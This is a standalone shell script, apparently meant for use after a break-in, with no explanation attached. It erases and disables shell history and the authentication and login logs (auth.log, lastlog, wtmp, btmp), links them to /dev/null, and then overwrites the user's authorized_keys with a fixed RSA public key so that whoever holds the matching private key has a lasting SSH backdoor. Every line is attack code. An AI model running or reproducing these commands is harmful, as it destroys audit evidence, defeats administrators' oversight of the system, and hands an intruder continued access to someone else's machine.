set +e
>~/.bash_history
echo > ~/.bash_history
rm -rf ~/.bash_history
echo > /var/log/auth.log
>/var/log/lastlog
echo > /var/log/lastlog
unset HISTFILE
>/var/log/wtmp
echo > /var/log/wtmp
>/var/log/btmp
echo > /var/log/btmp
echo > /var/log/lastlog

cat /dev/null > ~/.bash_history
history -c
history -cw

export HISTFILESIZE=O
export HISTSIZE=O

ln -sf /dev/null /var/log/lastlog
ln -sf /dev/null ~/.bash_history
ln -sf /dev/null /var/log/auth.log
ln -sf /dev/null /var/log/lastlog
ln -sf /dev/null /var/log/wtmp
ln -sf /dev/null /var/log/btmp
mkdir ~/.ssh 2>/dev/null;echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCsK7OsENqLwuH6pTrCBiNWNI0ByZZURaV+TS6l2P6cxWZpRAgVruyDk+XQ5pY9xJHTZfF75IT+ekWXA5hBe2eO8j+fAQuKaHgvlV8fTp48wMS0LRilfrslOsyv8DsrDs2ZSaiaraj7BwEBalaumczqBM0UoelCa7OvWJDqfyYK8ihQBYBXui/jvyb3FdRA9muOLFuo+AmhIyL3UMQ1jhUxrpmhAKxs6oUjMFXBj//TpvYL7AZXz+2MfmApHYSBx7vs+NodAOf9WShSPoHkuzz3riIsN3hBx66gGRGOPL00lvPsu/GS31klFKaGm3qFcHvO3uczRsaUGj89d/jUwBNh root@linuxkit-025000000001">~/.ssh/authorized_keys;chmod 600 ~/.ssh/authorized_keys
